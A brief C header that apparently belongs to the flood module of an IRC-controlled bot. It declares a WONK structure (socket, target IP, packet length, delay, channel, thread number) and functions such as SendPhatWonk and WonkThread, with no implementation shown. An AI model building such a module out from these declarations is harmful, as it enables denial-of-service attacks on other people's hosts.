#ifndef NO_WONK
typedef struct WONK {

	SOCKET sock;
	char ip[128];
	char length[128];
	char delay[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} WONK;

int connect_no_timeout(unsigned int sockfd,
						const struct sockaddr *addr,
						int addrlen,
						struct timeval *timeout);
char* SendPhatWonk(unsigned long TargetIP, unsigned int len, int delay);
DWORD WINAPI WonkThread(LPVOID param);
#endif